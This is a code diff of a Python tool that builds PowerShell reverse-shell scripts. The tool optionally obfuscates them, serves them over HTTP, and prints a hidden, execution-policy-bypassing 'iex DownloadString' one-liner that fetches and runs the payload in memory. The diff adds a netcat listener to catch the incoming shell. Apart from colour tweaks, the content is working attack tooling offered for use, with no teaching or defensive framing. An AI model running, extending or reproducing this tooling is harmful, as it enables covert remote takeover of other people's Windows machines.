@@ -1,30 +1,30 @@
-
-import random,socket,re,os,http.server,sys
+import random,socket,re,os,http.server,sys,threading,subprocess
 
 class PowershellReverseShell:
     def __init__(self):
+        #colors  - ansi escape codes
         self.reset_color = "\033[0m"
         self.bold_text = "\033[1m"
-        self.red_color = "\033[31m"
         self.yellow_color = "\033[33m"
         self.green_color = "\033[32m"
+        self.red_color = "\033[31m"
+        self.bold_reset = "\033[22m"
 
     #logo
     def logo(self):
-        return f"""{self.red_color}
-░█████████    ░██████   ░█████████    ░██████   
-░██     ░██  ░██   ░██  ░██     ░██  ░██   ░██  
-░██     ░██ ░██         ░██     ░██ ░██         
-░█████████   ░████████  ░█████████   ░████████  
-░██   ░██           ░██ ░██                 ░██ 
-░██    ░██   ░██   ░██  ░██          ░██   ░██  
-░██     ░██   ░██████   ░██           ░██████   
-                                  
------------------------------------------------
-{self.bold_text}    Reverse Shell Power Shell
------------------------------------------------{self.reset_color}
-        """
-
+        return f"""{self.green_color}
+    ░█████████    ░██████   ░█████████    ░██████   
+    ░██     ░██  ░██   ░██  ░██     ░██  ░██   ░██  
+    ░██     ░██ ░██         ░██     ░██ ░██         
+    ░█████████   ░████████  ░█████████   ░████████  
+    ░██   ░██           ░██ ░██                 ░██ 
+    ░██    ░██   ░██   ░██  ░██          ░██   ░██  
+    ░██     ░██   ░██████   ░██           ░██████   
+                                    {self.bold_text}
+    -----------------------------------------------
+        Reverse  Shell  Power  Shell
+    -----------------------------------------------{self.reset_color}\n"""
+    
     #obfuscate String
     def obfuscate_string(self,input_str):
         if not input_str:
@@ -95,7 +95,7 @@ class PowershellReverseShell:
             return True
         else:
             return False
-    
+        
     #read powershell file content (format)
     def read_powershell_model_from_res(self,file_name):
         script_dir = os.path.dirname(os.path.abspath(__file__))
@@ -105,10 +105,10 @@ class PowershellReverseShell:
                 return file.read()
             
         except FileNotFoundError:
-            print(f"{self.red_color}[X] File '{file_name}' Not found.{self.reset_color}")
+            print(f"{self.red_color}[X] File {self.bold_text}'{file_name}'{self.bold_reset} Not found.{self.reset_color}")
             return False
         except Exception as e:
-            print(f"{self.red_color}[X]Error Occured Reading File: {e}{self.reset_color}")
+            print(f"{self.red_color}[X] Error Occured Reading File: {self.bold_reset}{e}{self.reset_color}")
 
     #write modified content
     def write_content_to_powershell_file(self,content,file_name):
@@ -117,19 +117,19 @@ class PowershellReverseShell:
         try:
             with open(new_ps1_file_path,"w",encoding="utf-8") as newps1File:
                 newps1File.write(content)
-                print(f"{self.green_color}[+] Created File {file_name}.ps1\nLocation:{new_ps1_file_path}{self.reset_color}") 
+                print(f"{self.green_color}[+] Created File {self.bold_text}{file_name}.ps1 {self.bold_reset}\nLocation:{self.bold_text}{new_ps1_file_path}{self.reset_color}") 
                 return True
             
         except Exception as e:
-            print(f"{self.red_color}[X] Error Writing New File : {e}{self.reset_color}")
+            print(f"{self.red_color}[X] Error Writing New File : {self.bold_text}{e}{self.reset_color}")
             return False
-        
+    
     #host file
-    def host_file(self,file_name,port):
+    def host_file(self,file_name,port,enable_threading):
         ip = self.get_my_available_ip()
         if ip!=False:
-            print(f"[+]Available on :  http://{ip}:{port}/{file_name}.ps1")
-            print(f"\n[+]QUick Execute Code (hidden/run in memmory) :\n\n{self.yellow_color} powershell -WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -Command \"iex (New-Object net.WebClient).DownloadString('http://{ip}:{port}/{file_name}.ps1')\"{self.reset_color}\n")
+            print(f"{self.green_color}[+]Available on : {self.bold_text} http://{ip}:{port}/{file_name}.ps1{self.reset_color}")
+            print(f"\n[+]QUick Execute Code (hidden/run in memmory) :\n---------------------------------------------\n\n{self.yellow_color} powershell -WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -Command \"iex (New-Object net.WebClient).DownloadString('http://{ip}:{port}/{file_name}.ps1')\"{self.reset_color}\n")
         else:
             print(f"{self.red_color}[X]Could'nt List Ip address{self.reset_color}")
 
@@ -138,16 +138,26 @@ class PowershellReverseShell:
             handler = http.server.SimpleHTTPRequestHandler
             server_address = ('0.0.0.0', port)
             httpd = http.server.ThreadingHTTPServer(server_address, handler)
-            print(f"{self.green_color}[+] Server successfully running on port {port}...{self.reset_color}")
-            print(f"{self.green_color}[!] Press CTRL+C to stop hosting.{self.reset_color}")
-            httpd.serve_forever()
+            print(f"{self.green_color}[+] Server successfully running on port {self.bold_text}{port}{self.reset_color}")
+            print(f"{self.green_color}[!] Press {self.bold_text}CTRL+C{self.bold_reset} to stop hosting.{self.reset_color}")
+            if enable_threading == True:
+                server_thread = threading.Thread(target=httpd.serve_forever)
+                server_thread.daemon = True 
+                server_thread.start()
+            else:
+                httpd.serve_forever()
+
 
         except KeyboardInterrupt:
             print(f"\n{self.green_color}[-] Server stopped cleanly by user.{self.reset_color}")
             httpd.server_close()
         
         except Exception as e:
-            print(f"[X] Server failed to start: {e}")
+            print(f"{self.red_color}[X] Server failed to start: {self.bold_text}{e}{self.reset_color}")
+    
+    #start socket server
+    def start_socket_server(self,port):
+        subprocess.run(["nc", "-lvp", port])
 
     #start
     def start(self):
@@ -156,35 +166,35 @@ class PowershellReverseShell:
 
         #get server ip address 
         default_ip = self.get_my_available_ip()
-        server_ip = input(f"Enter Server IP {self.yellow_color}[default={default_ip}]: {self.reset_color} ")
+        server_ip = input(f"Enter Server IP {self.green_color}[default={self.bold_text}{default_ip}{self.bold_reset}]: {self.reset_color} ")
         if self.check_valid_ip_address(server_ip)==False:
-            print(f"{self.green_color}[X] Invalid IP Address Found! Ip defaulted to {default_ip} {self.reset_color}")
+            print(f"{self.green_color}[X] Invalid IP Address Found! Ip defaulted to {self.bold_text}{default_ip} {self.reset_color}")
             server_ip = default_ip
 
         #get server port
         default_port = "4444"
-        server_port = input(f"Enter Server Port {self.yellow_color}[default={default_port}]: {self.reset_color}")
+        server_port = input(f"Enter Server Port {self.green_color}[default={self.bold_text}{default_port}{self.bold_reset}]: {self.reset_color}")
         if self.check_valid_port(server_port)==False:
-            print(f"{self.green_color}[X] Invalid Port Number Found! Port defaulted to {default_port} {self.reset_color} ")
+            print(f"{self.green_color}[X] Invalid Port Number Found! Port defaulted to {self.bold_text} {default_port} {self.reset_color} ")
             server_port = default_port
 
         #get file name
         default_filename = "test"
-        filename = input(f"Enter Name of the New File {self.yellow_color}[default={default_filename}] : {self.reset_color}")
+        filename = input(f"Enter Name of the New File {self.green_color}[default={self.bold_text}{default_filename}{self.bold_reset}] : {self.reset_color}")
         if filename=="":
             filename = default_filename
-            print(f"{self.green_color}[X] Filename not specified! Filename Defaulted to '{default_filename}' {self.reset_color}")
+            print(f"{self.green_color}[X] Filename not specified! Filename Defaulted to {self.green_color}'{self.bold_text}{default_filename}{self.bold_reset}' {self.reset_color}")
 
         #obfuscation option
         format_model = "nobf_backup.txt"
         obfuscation = False
-        enable_obfuscation = input(f"Enable Obfuscation [y/n] {self.yellow_color}[default=n] : {self.reset_color}")
+        enable_obfuscation = input(f"Enable Obfuscation [y/n] {self.green_color}[default={self.bold_text}n{self.bold_reset}] : {self.reset_color}")
         if enable_obfuscation == "y":
             format_model = "obf_backup.txt"
-            print(f"{self.green_color}[+]Obfuscation Enabled{self.reset_color}")
+            print(f"{self.green_color}[+] Obfuscation {self.bold_text}Enabled{self.reset_color}")
             obfuscation=True
         else:
-            print(f"{self.green_color}[+]Obfuscation Disabled{self.reset_color}")
+            print(f"{self.green_color}[+] Obfuscation {self.bold_text}Disabled{self.reset_color}")
             obfuscation=False
 
         #generate powershell file
@@ -202,25 +212,47 @@ class PowershellReverseShell:
         #write
         self.write_content_to_powershell_file(powershell_file_content,filename)
 
+        #listener
+        start_listener = False
+        start_listener_input = input(f"Start Listener (port : {self.green_color}{self.bold_text}{server_port}{self.reset_color}) [y/n] {self.green_color}[default={self.bold_text}n{self.bold_reset}]{self.reset_color} : ")
+        if start_listener_input == "y":
+            try:
+                subprocess.run(["nc","--version"])
+                start_listener = True
+                print(f"{self.green_color}[+] Listener will be {self.bold_text}Running..{self.reset_color}")
+            except FileNotFoundError:
+                start_listener = False
+                print(f"{self.yellow_color}[+] Netcat not installed, Listener {self.bold_text}wont be be running..{self.reset_color}")
+        else:
+            start_listener = False
+            print(f"{self.green_color}[+] Listener {self.bold_text}wont be be running..{self.reset_color}")
+
         #enable hosting
         hosting = False
         hosting_default_port = 8080
-        enable_hosting = input(f"File Generated! Host the File? [y/n] {self.yellow_color}[default=n] : {self.reset_color}")
+        enable_hosting = input(f"File Generated! Host the File? [y/n] {self.green_color}[default={self.bold_text}n{self.bold_reset}] : {self.reset_color}")
         hosting_port=0
-        
+
         if enable_hosting== "y":
             try:
-                hosting_port = int(input(f"Enter port to host the File {self.yellow_color}[default=8080] : {self.reset_color}"))
+                hosting_port = int(input(f"Enter port to host the File {self.green_color}[default={self.bold_text}8080{self.bold_reset}] : {self.reset_color}"))
                 if not self.check_valid_port(str(hosting_port))==True:
                     hosting_port = hosting_default_port
             except ValueError:
-                print(f"{self.green_color}[X] Invalid Port! Port Defaulted into {hosting_default_port}{self.reset_color} ")
+                print(f"{self.green_color}[X] Invalid Port! Port Defaulted into {self.bold_text}{hosting_default_port}{self.reset_color} ")
                 hosting_port = hosting_default_port
             hosting = True
         
         #hosting
         if hosting ==True:
-            self.host_file(file_name=filename,port=hosting_port)
+            self.host_file(file_name=filename,port=hosting_port,enable_threading=start_listener)
+        
+        if start_listener == True:
+            try:
+               self.start_socket_server(server_port)
+            except KeyboardInterrupt:
+                print(f"{self.green_color}{self.bold_text}Exiting..{self.reset_color}")
+                sys.exit(0)
 
 main = PowershellReverseShell()
 try:
